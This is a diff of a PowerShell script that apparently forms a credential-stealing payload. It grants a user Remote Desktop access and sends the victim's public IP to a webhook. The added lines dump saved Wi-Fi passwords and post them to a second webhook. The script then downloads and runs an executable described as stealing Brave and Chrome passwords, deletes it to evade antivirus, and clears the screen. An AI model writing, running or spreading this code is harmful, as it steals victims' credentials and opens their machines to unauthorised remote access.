@@ -9,6 +9,8 @@ net localgroup "Remote Desktop Users" blanka /add
 # Sending IP to webhook for remote access
 $PublicIP = Invoke-RestMethod -Uri 'https://api.ipify.org?format=text'
 Invoke-RestMethod -Uri 'https://16b0dcac26d763dafecd45d9e1ff9575.m.pipedream.net' -Method Post -ContentType 'application/json' -Body @{PublicIP=$PublicIP}
+#This gets saved wifi passwords and sends them to a webhook
+function Send-DataToWebhook { param ($WebhookUrl, $Data) try { $body = @{content = $Data} | ConvertTo-Json; Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "application/json" -Body $body } catch { Write-Output "Error sending data to webhook: $($_.Exception.Message)" } }; $wifiData = @(); $wifiProfiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }; foreach ($profile in $wifiProfiles) { $wifiPassword = (netsh wlan show profile name="$profile" key=clear) | Select-String "Key Content"; if ($wifiPassword) { $wifiPassword = $wifiPassword.ToString().Split(":")[1].Trim(); $wifiData += "Wi-Fi Network: $profile, Password: $wifiPassword" } }; $allWifiData = $wifiData -join "`r`n"; $webhookUrl = "https://0478e3e892317a48ef08f1b058841bb1.m.pipedream.net"; Send-DataToWebhook -WebhookUrl $webhookUrl -Data $allWifiData
 #This downloads beta.exe which gets saved brave and chrome passwords and sends them to webhook (normally this happens too fast for any antivirus to notice it but sometimes it is caught)
 Invoke-WebRequest -Uri 'github.com/Adhrit121/Data_storage/raw/main/beta.exe' -OutFile 'beta.exe'
 Start-Process -FilePath 'beta.exe'; Start-Sleep -Seconds 2; while(Get-Process -Name 'beta' -ErrorAction SilentlyContinue){Start-Sleep -Seconds 1}; Remove-Item 'beta.exe' -Force; clear;
